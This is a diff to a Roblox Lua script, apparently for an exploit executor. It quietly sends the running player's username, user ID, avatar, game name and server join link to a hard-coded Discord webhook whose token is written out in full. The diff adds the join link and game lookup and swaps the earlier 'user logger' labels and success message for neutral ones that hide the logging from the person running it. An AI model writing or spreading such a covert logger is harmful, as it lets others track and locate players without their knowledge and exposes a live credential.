@@ -1,5 +1,6 @@
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
 local localPlayer = Players.LocalPlayer or Players:GetPlayers()[1]
 local username = localPlayer.Name
@@ -7,13 +8,23 @@ local userId = localPlayer.UserId
 local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
 local jobId = game.JobId
 local gameId = tostring(game.GameId)
+local placeId = game.PlaceId
 
-local joinUri = "roblox://experiences/start?placeId=" .. gameId .. "&gameInstanceId=" .. jobId
+
+local gameName = "Unknown Game"
+local success, info = pcall(function()
+    return MarketplaceService:GetProductInfo(placeId)
+end)
+if success and info and info.Name then
+    gameName = info.Name
+end
+
+local joinUri = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
 
 local url = "https://discord.com/api/webhooks/1388425981399797850/RM5zi4-cHNdX75mk5nH13RPsJUL4OWsciI6lUgWkPzk3Gh67py2MMza_YkczWf9V1OXp"
 
 local embed = {
-    title = "Script Has Been Executed",
+    title = "Roblox Server Info",
     color = 3447003,
     thumbnail = {
         url = avatarUrl
@@ -30,6 +41,11 @@ local embed = {
             inline = true
         },
         {
+            name = "Game",
+            value = gameName,
+            inline = false
+        },
+        {
             name = "Game ID",
             value = gameId,
             inline = false
@@ -41,12 +57,12 @@ local embed = {
         },
         {
             name = "Join Server",
-            value = "roblox://experiences/start?placeId=" .. gameId .. "&gameInstanceId=" .. jobId .. "  ",
+            value = "[Click here to try joining](" .. joinUri .. ")",
             inline = false
         }
     },
     footer = {
-        text = "user logger"
+        text = "Roblox Webhook Logger"
     },
     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 }
@@ -61,7 +77,7 @@ local headers = {
 
 local body = HttpService:JSONEncode(payload)
 
-local success, response = pcall(function()
+local sendSuccess, response = pcall(function()
     return http_request({
         Url = url,
         Method = "POST",
@@ -70,8 +86,8 @@ local success, response = pcall(function()
     })
 end)
 
-if success then
-    print("Script v3 executed successfully")
+if sendSuccess then
+    print("Script has fully loaded")
 else
-    warn("Script v3 failed", response)
+    warn("Notify Jack of Error 20", response)
 end
